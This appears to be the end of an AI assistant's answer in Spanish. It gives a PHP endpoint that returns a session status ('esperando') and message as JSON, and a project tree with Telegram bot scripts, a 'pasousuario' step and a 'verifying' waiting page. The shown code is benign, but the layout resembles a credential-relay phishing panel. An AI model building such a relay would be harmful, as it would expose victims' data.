<?php
session_start();
header('Content-Type: application/json');

$estado = $_SESSION['estado'] ?? 'esperando';
$mensaje = $_SESSION['mensaje'] ?? '';

echo json_encode([
    'estado' => $estado,
    'mensaje' => $mensaje
]);
?>
```

## 📂 **Estructura final que debes tener:**
```
tu-proyecto/
├── process/
│   ├── telegram_bot.php ✅
│   ├── pasousuario.php ✅ (modificado)
│   └── update_status.php ✅ (nuevo)
├── verifying/
│   ├── index.html ✅ (modificado)
│   └── check_status.php ✅ (nuevo)
└── telegram_bot.py ✅ (raíz)
